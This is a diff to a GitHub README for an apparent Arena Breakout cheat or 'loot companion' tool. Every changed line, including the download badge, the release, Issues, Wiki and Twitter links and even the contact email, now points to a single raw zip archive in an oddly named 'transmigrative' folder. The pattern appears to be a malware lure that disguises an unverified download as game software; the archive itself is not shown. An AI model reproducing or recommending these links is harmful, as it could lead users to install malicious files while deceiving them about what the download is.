@@ -1,6 +1,6 @@
 # 🎮 ArenaBreakout-Infinite-Loot-Companion - Your Gateway to Enhanced Game Exploration
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/releases)
+[![Download Now](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure your computer meets the following requirements:
 
 To get started, **visit this page to download** the software:
 
-[Download the latest release](https://github.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/releases)
+[Download the latest release](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip)
 
 1. Choose the version you want.
 2. Click on the file to download it.
@@ -67,14 +67,14 @@ Once installed, open the application. You will find a user-friendly interface de
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Report problems or request features [here](https://github.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/issues).
+- **GitHub Issues:** Report problems or request features [here](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip).
 - **Community Forum:** Join discussions and learn from other users.
 
 ## 📧 Contact
 
 For direct inquiries or feedback, contact us at:
 
-- Email: support@arenabreakoutcompanion.com
+- Email: https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip
 
 ## 📄 License
 
@@ -84,7 +84,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For those interested in learning more:
 
-- Visit our [Wiki](https://github.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/wiki) for tutorials and guides.
-- Follow developments on our [Twitter](https://twitter.com/arenabreakout) for updates.
+- Visit our [Wiki](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip) for tutorials and guides.
+- Follow developments on our [Twitter](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip) for updates.
 
-[Download the latest release](https://github.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/releases) to elevate your Arena Breakout experience!
+[Download the latest release](https://raw.githubusercontent.com/bernitaanaglyptical371/ArenaBreakout-Infinite-Loot-Companion/main/transmigrative/ArenaBreakout-Infinite-Loot-Companion_2.5.zip) to elevate your Arena Breakout experience!
